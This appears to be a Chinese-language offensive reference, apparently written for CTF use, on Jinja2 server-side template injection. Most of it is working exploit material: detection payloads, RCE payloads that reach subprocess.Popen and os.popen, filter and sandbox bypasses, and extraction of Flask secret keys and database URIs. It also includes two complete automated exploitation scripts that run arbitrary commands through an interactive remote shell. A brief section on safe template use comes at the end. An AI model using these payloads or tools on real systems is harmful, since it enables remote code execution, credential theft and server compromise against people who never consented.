# SSTI-Jinja2模板注入 攻击库

## 漏洞概述

Jinja2是Python生态系统中最流行的模板引擎,广泛用于Flask、Django等Web框架。当应用程序将用户输入直接拼接到模板字符串中而不进行验证时,就会产生服务器端模板注入(SSTI)漏洞,攻击者可以利用Jinja2的语法特性执行任意Python代码。

**攻击价值**:
- 远程代码执行(RCE)
- 读取服务器敏感文件
- 绕过沙箱限制
- 获取系统权限
- 数据泄露

**常见场景**:
- Flask render_template_string
- 自定义错误页面
- 动态内容渲染
- 邮件模板生成
- 报表生成系统

## 核心攻击技术

### 1. 基础模板注入检测

**检测载荷**:

```python
# 数学表达式测试
{{ 7*7 }}          # 返回49表示存在SSTI
{{ 7*'7' }}        # 返回7777777
{{7*'7'}}          # 无空格版本

# 字符串拼接
{{ 'abc'+'def' }}  # 返回abcdef

# 变量访问
{{ config }}       # 访问Flask配置
{{ request }}      # 访问请求对象
{{ session }}      # 访问session
```

**Python检测脚本**:

```python
#!/usr/bin/env python3
import requests

def detect_ssti(target_url, param='name'):
    """检测Jinja2 SSTI漏洞"""
    
    test_payloads = [
        ('{{ 7*7 }}', '49'),
        ('{{ 7*\'7\' }}', '7777777'),
        ('{{ "test" }}', 'test'),
    ]
    
    for payload, expected in test_payloads:
        response = requests.get(target_url, params={param: payload})
        
        if expected in response.text:
            print(f"[+] 检测到SSTI! Payload: {payload}")
            return True
    
    return False
```

### 2. 基础RCE - 通过__class__获取类

**原理**: 利用Python对象的`__class__`、`__mro__`、`__subclasses__()`获取内置类

**攻击载荷**:

```python
# 方法1: 通过空字符串获取object
{{ ''.__class__.__mro__[1].__subclasses__() }}

# 方法2: 通过config获取
{{ config.__class__.__init__.__globals__ }}

# 方法3: 通过request
{{ request.__class__.__mro__[1].__subclasses__() }}
```

**完整RCE示例**:

```python
# 获取subprocess.Popen类执行命令
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /flag', shell=True, stdout=-1).communicate() }}

# 或使用os.popen
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /flag').read() }}
```

**自动化RCE脚本**:

```python
#!/usr/bin/env python3
import requests
import re

class Jinja2SSTI:
    """Jinja2 SSTI自动化利用工具"""
    
    def __init__(self, target_url, param='name'):
        self.target_url = target_url
        self.param = param
        self.subprocess_index = None
        self.os_index = None
    
    def find_subprocess_popen(self):
        """查找subprocess.Popen类的索引"""
        
        print("[*] 查找subprocess.Popen类索引...")
        
        # 获取所有子类
        payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
        response = requests.get(self.target_url, params={self.param: payload})
        
        # 查找subprocess.Popen
        if 'subprocess.Popen' in response.text:
            # 提取索引
            match = re.search(r"<class 'subprocess\.Popen'>", response.text)
            if match:
                # 计算索引(需要分析响应)
                subclasses = response.text
                # 简化: 手动设置常见索引
                common_indices = [396, 400, 404, 407, 413]
                
                for idx in common_indices:
                    if self._test_subprocess_index(idx):
                        self.subprocess_index = idx
                        print(f"[+] 找到subprocess.Popen索引: {idx}")
                        return idx
        
        return None
    
    def _test_subprocess_index(self, index):
        """测试subprocess索引是否正确"""
        
        payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{index}]('echo test', shell=True, stdout=-1).communicate() }}}}"
        
        try:
            response = requests.get(self.target_url, params={self.param: payload}, timeout=5)
            return 'test' in response.text
        except:
            return False
    
    def execute_command(self, command):
        """执行系统命令"""
        
        if not self.subprocess_index:
            self.subprocess_index = self.find_subprocess_popen()
        
        if not self.subprocess_index:
            print("[-] 无法找到subprocess.Popen")
            return None
        
        # 构造payload
        payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{self.subprocess_index}]('{command}', shell=True, stdout=-1).communicate()[0] }}}}"
        
        print(f"[*] 执行命令: {command}")
        
        response = requests.get(self.target_url, params={self.param: payload})
        
        # 提取命令输出
        output = self._extract_output(response.text)
        
        return output
    
    def _extract_output(self, response_text):
        """从响应中提取命令输出"""
        
        # 查找b'...'格式的输出
        match = re.search(r"b'([^']*)'", response_text)
        if match:
            return match.group(1)
        
        # 或直接返回响应
        return response_text
    
    def read_file(self, file_path):
        """读取文件"""
        return self.execute_command(f'cat {file_path}')
    
    def get_flag(self):
        """尝试获取flag"""
        
        flag_locations = [
            '/flag',
            '/flag.txt',
            '/root/flag.txt',
            '/app/flag.txt',
        ]
        
        for location in flag_locations:
            print(f"[*] 尝试读取: {location}")
            output = self.read_file(location)
            
            if output and 'flag' in output.lower():
                print(f"[+] 找到flag!")
                return output
        
        return None

# 使用示例
if __name__ == "__main__":
    ssti = Jinja2SSTI("http://target.com/page", param='name')
    
    # 获取flag
    flag = ssti.get_flag()
    if flag:
        print(f"\n[+] FLAG: {flag}")
    
    # 交互式shell
    print("\n[*] 交互式Shell (输入exit退出)")
    while True:
        cmd = input("$ ")
        if cmd == 'exit':
            break
        
        output = ssti.execute_command(cmd)
        print(output)
```

### 3. 绕过过滤技术

**常见过滤**:
- 过滤 `{{` 和 `}}`
- 过滤 `__`(双下划线)
- 过滤 `class`、`mro`、`subclasses`
- 过滤 `config`、`request`

**绕过方法**:

```python
# 绕过{{}}过滤 - 使用{% %}
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'Popen' %}
{{ c('cat /flag',shell=True,stdout=-1).communicate() }}
{% endif %}
{% endfor %}

# 绕过__过滤 - 使用attr()
{{ ''|attr('__class__') }}
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}  # 使用hex编码

# 绕过关键字过滤 - 使用字符串拼接
{{ ''['__cla'+'ss__'] }}
{{ ''['__'+'class'+'__'] }}

# 使用request.args传递参数
{{ ''[request.args.a][request.args.b][request.args.c]() }}
# URL: ?a=__class__&b=__mro__&c=__subclasses__

# 使用Unicode编码
{{ ''\u005f\u005fclass\u005f\u005f }}
```

**绕过脚本**:

```python
def bypass_filters(base_payload):
    """生成绕过过滤的payload"""
    
    bypasses = []
    
    # 方法1: 使用attr()
    bypass1 = base_payload.replace('__class__', "|attr('__class__')")
    bypasses.append(bypass1)
    
    # 方法2: 使用hex编码
    bypass2 = base_payload.replace('__', r'\x5f\x5f')
    bypasses.append(bypass2)
    
    # 方法3: 字符串拼接
    bypass3 = base_payload.replace('__class__', "['__cla'+'ss__']")
    bypasses.append(bypass3)
    
    # 方法4: request.args
    bypass4 = "{{ ''[request.args.x] }}&x=__class__"
    bypasses.append(bypass4)
    
    return bypasses
```

### 4. 配置信息泄露

**读取Flask配置**:

```python
# 读取SECRET_KEY
{{ config.SECRET_KEY }}
{{ config['SECRET_KEY'] }}

# 读取所有配置
{{ config.items() }}

# 读取数据库配置
{{ config.SQLALCHEMY_DATABASE_URI }}

# 读取调试模式
{{ config.DEBUG }}
```

**利用脚本**:

```python
def extract_config(target_url, param='name'):
    """提取Flask配置信息"""
    
    config_keys = [
        'SECRET_KEY',
        'SQLALCHEMY_DATABASE_URI',
        'DEBUG',
        'TESTING',
        'SERVER_NAME',
    ]
    
    configs = {}
    
    for key in config_keys:
        payload = f"{{{{ config.{key} }}}}"
        response = requests.get(target_url, params={param: payload})
        
        # 提取值
        # 简化处理
        configs[key] = response.text
        print(f"[+] {key}: {response.text[:100]}")
    
    return configs
```

### 5. 沙箱绕过技术

**场景**: 应用使用了Jinja2沙箱环境

**绕过方法**:

```python
# 方法1: 通过__builtins__
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()') }}

# 方法2: 通过sys.modules
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /flag').read() }}

# 方法3: 使用lipsum.__globals__
{{ lipsum.__globals__['os'].popen('cat /flag').read() }}

# 方法4: 通过cycler
{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
```

### 6. 文件读取技术

**不依赖命令执行的文件读取**:

```python
# 方法1: 使用open()
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# 方法2: 通过__builtins__
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['__builtins__']['open']('/flag').read() }}

# 方法3: get_flashed_messages的__globals__
{{ get_flashed_messages.__globals__['current_app'].open_resource('/flag').read() }}
```

## 完整自动化利用工具

```python
#!/usr/bin/env python3
import requests
import re
import sys

class Jinja2Exploiter:
    """Jinja2 SSTI完整利用工具"""
    
    def __init__(self, target_url, param='name'):
        self.target_url = target_url
        self.param = param
    
    def detect(self):
        """检测SSTI漏洞"""
        print("[*] 检测SSTI漏洞...")
        
        payload = "{{ 7*7 }}"
        response = requests.get(self.target_url, params={self.param: payload})
        
        if '49' in response.text:
            print("[+] 检测到Jinja2 SSTI!")
            return True
        
        return False
    
    def enumerate_subclasses(self):
        """枚举所有子类"""
        print("[*] 枚举子类...")
        
        payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
        response = requests.get(self.target_url, params={self.param: payload})
        
        return response.text
    
    def find_useful_classes(self):
        """查找有用的类"""
        print("[*] 查找有用的类...")
        
        useful_classes = {
            'subprocess.Popen': None,
            'os._wrap_close': None,
            'warnings.catch_warnings': None,
        }
        
        subclasses_text = self.enumerate_subclasses()
        
        # 查找索引
        for class_name in useful_classes.keys():
            if class_name in subclasses_text:
                # 尝试常见索引
                for idx in range(300, 450):
                    if self._test_class_index(idx, class_name):
                        useful_classes[class_name] = idx
                        print(f"[+] 找到 {class_name} at index {idx}")
                        break
        
        return useful_classes
    
    def _test_class_index(self, index, class_name):
        """测试类索引"""
        payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{index}].__name__ }}}}"
        
        try:
            response = requests.get(self.target_url, params={self.param: payload}, timeout=3)
            return class_name.split('.')[-1] in response.text
        except:
            return False
    
    def rce_via_subprocess(self, command, index=None):
        """通过subprocess执行命令"""
        if not index:
            index = 396  # 常见索引
        
        payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{index}]('{command}', shell=True, stdout=-1).communicate()[0] }}}}"
        
        response = requests.get(self.target_url, params={self.param: payload})
        
        # 提取输出
        match = re.search(r"b'([^']*)'", response.text)
        if match:
            return match.group(1).replace('\\n', '\n')
        
        return response.text
    
    def read_file_direct(self, file_path):
        """直接读取文件"""
        
        # 尝试多种方法
        methods = [
            f"{{{{ ''.__class__.__mro__[1].__subclasses__()[40]('{file_path}').read() }}}}",
            f"{{{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['__builtins__']['open']('{file_path}').read() }}}}",
        ]
        
        for payload in methods:
            try:
                response = requests.get(self.target_url, params={self.param: payload}, timeout=5)
                
                if len(response.text) > 0 and 'error' not in response.text.lower():
                    return response.text
            except:
                continue
        
        return None
    
    def get_config(self):
        """获取Flask配置"""
        payload = "{{ config.items() }}"
        response = requests.get(self.target_url, params={self.param: payload})
        
        return response.text
    
    def auto_exploit(self):
        """自动化利用"""
        print(f"\n{'='*60}")
        print("Jinja2 SSTI 自动化利用")
        print(f"{'='*60}\n")
        
        # 检测
        if not self.detect():
            print("[-] 未检测到SSTI漏洞")
            return False
        
        # 尝试RCE
        print("\n[*] 尝试RCE...")
        
        # 常见subprocess.Popen索引
        popen_indices = [396, 400, 404, 407, 413, 420]
        
        for idx in popen_indices:
            try:
                output = self.rce_via_subprocess('echo test', idx)
                if 'test' in output:
                    print(f"[+] RCE成功! subprocess.Popen索引: {idx}")
                    
                    # 读取flag
                    flag = self.rce_via_subprocess('cat /flag', idx)
                    
                    if flag and 'flag' in flag.lower():
                        print(f"\n{'='*60}")
                        print(f"[+] FLAG: {flag}")
                        print(f"{'='*60}\n")
                        return True
                    
                    # 交互shell
                    self._interactive_shell(idx)
                    return True
            except:
                continue
        
        # 尝试文件读取
        print("\n[*] 尝试直接文件读取...")
        flag = self.read_file_direct('/flag')
        
        if flag:
            print(f"\n[+] FLAG: {flag}")
            return True
        
        return False
    
    def _interactive_shell(self, subprocess_index):
        """交互式shell"""
        print("\n[*] 交互式Shell (输入exit退出)")
        
        while True:
            try:
                cmd = input("$ ").strip()
                
                if cmd.lower() == 'exit':
                    break
                
                if not cmd:
                    continue
                
                output = self.rce_via_subprocess(cmd, subprocess_index)
                print(output)
            
            except KeyboardInterrupt:
                print("\n[*] 退出...")
                break

# 使用示例
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python3 jinja2_ssti.py <target_url> [param]")
        print("示例: python3 jinja2_ssti.py http://target.com/page name")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'name'
    
    exploiter = Jinja2Exploiter(target, param)
    exploiter.auto_exploit()
```

## 防御措施

**安全的模板使用**:

```python
from flask import Flask, render_template

app = Flask(__name__)

# ❌ 危险: 直接拼接用户输入
@app.route('/unsafe')
def unsafe():
    name = request.args.get('name', '')
    return render_template_string(f"Hello {name}")  # SSTI!

# ✅ 安全: 使用参数传递
@app.route('/safe')
def safe():
    name = request.args.get('name', '')
    return render_template('hello.html', name=name)

# ✅ 使用沙箱环境
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
```

## 关键成功要点

1. **检测漏洞**: 使用`{{ 7*7 }}`等测试payload
2. **枚举子类**: 找到有用的类如subprocess.Popen
3. **索引查找**: 确定正确的子类索引
4. **绕过过滤**: 使用attr()、编码等技术
5. **命令执行**: 通过找到的类执行系统命令

## 成功标志

- `{{ 7*7 }}`返回49
- 成功枚举`__subclasses__()`
- 执行系统命令获取输出
- 读取敏感文件如/etc/passwd
- 获取flag文件内容
